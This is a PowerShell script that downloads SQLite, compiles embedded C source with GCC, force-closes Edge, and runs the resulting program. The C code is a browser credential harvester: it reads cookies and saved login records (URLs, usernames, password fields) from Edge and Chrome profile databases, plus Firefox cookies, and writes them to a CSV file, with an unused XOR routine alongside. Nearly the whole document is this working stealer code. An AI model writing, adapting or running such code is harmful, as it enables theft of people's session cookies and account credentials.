# Define the URL for the SQLite amalgamation ZIP file
$headerUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3470000.zip"
$headerZipPath = "$env:TEMP\sqlite-amalgamation.zip"
$w64devkitPath = "C:\C"

# Define the C code
$cCode = @"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include "sqlite3.h"

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0500
#endif

void decrypt(char *str) {
    while (*str) {
        *str = *str ^ 0xAA;
        str++;
    }
}

void write_to_csv(FILE *file, const char *type, const char *col1, const char *col2, const char *col3) {
    fprintf(file, "%s,%s,%s,%s\n", type, col1, col2, col3);
}

void read_cookies(sqlite3 *db, FILE *file) {
    sqlite3_stmt *res;
    const char *sql = "SELECT host_key, name, value FROM cookies";
    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch cookies: %s\n", sqlite3_errmsg(db));
        return;
    }

    while (sqlite3_step(res) == SQLITE_ROW) {
        write_to_csv(file, "Cookie",
                     (const char *)sqlite3_column_text(res, 0),
                     (const char *)sqlite3_column_text(res, 1),
                     (const char *)sqlite3_column_text(res, 2));
    }

    sqlite3_finalize(res);
}

void read_passwords(sqlite3 *db, FILE *file) {
    sqlite3_stmt *res;
    const char *sql = "SELECT origin_url, username_value, password_value FROM logins";
    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to fetch passwords: %s\n", sqlite3_errmsg(db));
        return;
    }

    while (sqlite3_step(res) == SQLITE_ROW) {
        write_to_csv(file, "Password",
                     (const char *)sqlite3_column_text(res, 0),
                     (const char *)sqlite3_column_text(res, 1),
                     (const char *)sqlite3_column_text(res, 2));
    }

    sqlite3_finalize(res);
}

void inspect_schema(sqlite3 *db) {
    sqlite3_stmt *res;
    const char *sql = "SELECT name FROM sqlite_master WHERE type='table'";
    int rc = sqlite3_prepare_v2(db, sql, -1, &res, 0);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to inspect schema: %s\n", sqlite3_errmsg(db));
        return;
    }

    printf("Tables in the database:\n");
    while (sqlite3_step(res) == SQLITE_ROW) {
        printf("%s\n", sqlite3_column_text(res, 0));
    }

    sqlite3_finalize(res);
}

void read_database(const char *db_path, void (*read_func)(sqlite3 *, FILE *), FILE *file) {
    sqlite3 *db;
    int rc = sqlite3_open(db_path, &db);

    if (rc != SQLITE_OK) {
        fprintf(stderr, "Cannot open database %s: %s\n", db_path, sqlite3_errmsg(db));
        return;
    }

    printf("Reading database: %s\n", db_path);
    inspect_schema(db); // Inspect the schema before reading
    read_func(db, file);
    sqlite3_close(db);
}

void get_firefox_profile_path(char *profile_path, size_t size) {
    char appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata))) {
        snprintf(profile_path, size, "%s\\Mozilla\\Firefox\\Profiles", appdata);
    }
}

int main() {
    char edge_cookies[MAX_PATH];
    char edge_passwords[MAX_PATH];
    char chrome_cookies[MAX_PATH];
    char chrome_passwords[MAX_PATH];
    char firefox_profile[MAX_PATH];
    char firefox_cookies[MAX_PATH];

    // Get paths for Edge
    snprintf(edge_cookies, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
    snprintf(edge_passwords, MAX_PATH, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));

    // Get paths for Chrome
    snprintf(chrome_cookies, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Cookies", getenv("LOCALAPPDATA"));
    snprintf(chrome_passwords, MAX_PATH, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", getenv("LOCALAPPDATA"));

    // Get path for Firefox profile
    get_firefox_profile_path(firefox_profile, MAX_PATH);
    snprintf(firefox_cookies, MAX_PATH, "%s\\<profile>\\cookies.sqlite", firefox_profile); // Replace <profile> with actual profile name

    FILE *file = fopen("output.csv", "w");
    if (!file) {
        fprintf(stderr, "Cannot open output.csv for writing\n");
        return 1;
    }

    fprintf(file, "Type,Column1,Column2,Column3\n");

    printf("Reading Edge cookies and passwords...\n");
    read_database(edge_cookies, read_cookies, file);
    read_database(edge_passwords, read_passwords, file);

    printf("Reading Chrome cookies and passwords...\n");
    read_database(chrome_cookies, read_cookies, file);
    read_database(chrome_passwords, read_passwords, file);

    printf("Reading Firefox cookies...\n");
    read_database(firefox_cookies, read_cookies, file);

    fclose(file);

    return 0;
}
"@

# Download the SQLite amalgamation ZIP file
Write-Output "Downloading SQLite amalgamation..."
Invoke-WebRequest -Uri $headerUrl -OutFile $headerZipPath

# Extract the SQLite amalgamation ZIP file
Write-Output "Extracting SQLite amalgamation..."
Expand-Archive -Path $headerZipPath -DestinationPath $env:TEMP -Force

# Copy sqlite3.h and sqlite3.c to the w64devkit include directory
Write-Output "Copying sqlite3.h and sqlite3.c to w64devkit include directory..."
Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.h" -Destination "$w64devkitPath\include"
Copy-Item -Path "$env:TEMP\sqlite-amalgamation-3470000\sqlite3.c" -Destination "$w64devkitPath\include"

# Clean up downloaded files
Remove-Item -Path $headerZipPath

# Write the C code to a file
$cFilePath = "$env:TEMP\read_browser_data.c"
Set-Content -Path $cFilePath -Value $cCode

# Compile the C code using w64devkit GCC
Write-Output "Compiling the C code..."
& "$w64devkitPath\bin\gcc.exe" -o "$env:TEMP\read_browser_data.exe" $cFilePath "$w64devkitPath\include\sqlite3.c" -I"$w64devkitPath\include" -L"$w64devkitPath\lib" -lShell32

Write-Output "Compilation completed successfully!"

# Stop Edge process and wait until it ends
Write-Output "Stopping Edge process..."
Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
Write-Output "Waiting for Edge process to exit..."
Wait-Process -Name "msedge" -ErrorAction SilentlyContinue

# Execute the compiled executable
Write-Output "Executing the compiled program..."
& "$env:TEMP\read_browser_data.exe"

Write-Output "Execution completed. Check output.csv for results."
